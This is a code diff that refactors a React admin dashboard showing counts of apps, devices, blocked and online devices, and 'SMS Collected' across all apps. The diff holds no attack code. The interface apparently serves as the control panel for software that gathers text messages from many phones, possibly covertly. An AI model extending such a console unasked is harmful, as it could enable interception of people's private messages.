@@ -5,9 +5,7 @@ import Badge from "@/components/Badge";
 import type { AdminApp, Device } from "@/lib/types";
 import { getApps, getDevices, calcStats } from "@/lib/supabase";
 
-interface DashboardProps { onOpenApp: (app: AdminApp) => void; }
-
-export default function Dashboard({ onOpenApp }: DashboardProps) {
+export default function Dashboard() {
   const [apps, setApps] = useState<AdminApp[]>([]);
   const [deviceMap, setDeviceMap] = useState<Record<string, Device[]>>({});
   const [loading, setLoading] = useState(true);
@@ -32,21 +30,20 @@ export default function Dashboard({ onOpenApp }: DashboardProps) {
 
   useEffect(() => { load(); }, []);
 
-  const totalApps   = apps.length;
-  const activeApps  = apps.filter((a) => a.is_active).length;
-  const allDevices  = Object.values(deviceMap).flat();
-  const totalDev    = allDevices.length;
-  const blockedDev  = allDevices.filter((d) => d.status === "blocked").length;
-  const totalSms    = allDevices.reduce((s, d) => s + (d.total_sms_count ?? 0), 0);
-  const now         = Date.now();
-  const onlineDev   = allDevices.filter((d) => {
+  const totalApps  = apps.length;
+  const activeApps = apps.filter((a) => a.is_active).length;
+  const allDevices = Object.values(deviceMap).flat();
+  const totalDev   = allDevices.length;
+  const blockedDev = allDevices.filter((d) => d.status === "blocked").length;
+  const totalSms   = allDevices.reduce((s, d) => s + (d.total_sms_count ?? 0), 0);
+  const now        = Date.now();
+  const onlineDev  = allDevices.filter((d) => {
     const t = d.data_json?.online_checked_at ?? 0;
     return t > 0 && now - t < 15 * 60 * 1000;
   }).length;
 
   return (
     <div className="flex-1 overflow-auto bg-[#080c16]">
-      {/* Top bar */}
       <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center justify-between px-6">
         <div>
           <h1 className="text-sm font-semibold text-white">Dashboard</h1>
@@ -67,26 +64,18 @@ export default function Dashboard({ onOpenApp }: DashboardProps) {
           </div>
         ) : (
           <>
-            {/* Stats */}
             <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
-              <StatCard label="Total Apps" value={totalApps} icon={Boxes} color="blue"
-                        sub={`${activeApps} active`} />
-              <StatCard label="Total Devices" value={totalDev} icon={Smartphone} color="green"
-                        sub={`${onlineDev} online now`} />
-              <StatCard label="Blocked Devices" value={blockedDev} icon={ShieldOff} color="red"
-                        sub="across all apps" />
-              <StatCard label="SMS Collected" value={totalSms.toLocaleString()} icon={MessageSquare} color="amber"
-                        sub="total messages" />
+              <StatCard label="Total Apps"      value={totalApps}                  icon={Boxes}          color="blue"  sub={`${activeApps} active`} />
+              <StatCard label="Total Devices"   value={totalDev}                   icon={Smartphone}     color="green" sub={`${onlineDev} online now`} />
+              <StatCard label="Blocked Devices" value={blockedDev}                 icon={ShieldOff}      color="red"   sub="across all apps" />
+              <StatCard label="SMS Collected"   value={totalSms.toLocaleString()} icon={MessageSquare}  color="amber" sub="total messages" />
             </div>
 
-            {/* Recent apps */}
             <div>
-              <div className="flex items-center justify-between mb-3">
-                <h2 className="text-sm font-semibold text-white flex items-center gap-2">
-                  <TrendingUp className="w-4 h-4 text-blue-400" />
-                  All Applications
-                </h2>
-              </div>
+              <h2 className="text-sm font-semibold text-white flex items-center gap-2 mb-3">
+                <TrendingUp className="w-4 h-4 text-blue-400" />
+                All Applications
+              </h2>
 
               {apps.length === 0 ? (
                 <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
@@ -99,8 +88,8 @@ export default function Dashboard({ onOpenApp }: DashboardProps) {
                     const devs = deviceMap[app.token] ?? [];
                     const st   = calcStats(devs);
                     return (
-                      <button key={app.id} onClick={() => onOpenApp(app)}
-                              className="text-left bg-[#0d1220] border border-slate-800/80 hover:border-blue-500/30 rounded-2xl p-4 transition-all hover:bg-[#111827] group">
+                      <div key={app.id}
+                           className="bg-[#0d1220] border border-slate-800/80 rounded-2xl p-4">
                         <div className="flex items-start justify-between mb-3">
                           <div className="flex-1 min-w-0">
                             <p className="font-semibold text-white text-sm truncate">{app.label || app.token}</p>
@@ -110,8 +99,8 @@ export default function Dashboard({ onOpenApp }: DashboardProps) {
                         </div>
                         <div className="grid grid-cols-3 gap-2">
                           {[
-                            { l: "Devices", v: st.total, c: "text-white" },
-                            { l: "Online", v: st.online, c: "text-emerald-400" },
+                            { l: "Devices", v: st.total,   c: "text-white" },
+                            { l: "Online",  v: st.online,  c: "text-emerald-400" },
                             { l: "Blocked", v: st.blocked, c: "text-red-400" },
                           ].map(({ l, v, c }) => (
                             <div key={l} className="bg-[#080c16] rounded-xl p-2.5 text-center">
@@ -120,10 +109,7 @@ export default function Dashboard({ onOpenApp }: DashboardProps) {
                             </div>
                           ))}
                         </div>
-                        <p className="text-[10px] text-slate-700 mt-2.5 group-hover:text-slate-500 transition-colors">
-                          Click to manage →
-                        </p>
-                      </button>
+                      </div>
                     );
                   })}
                 </div>
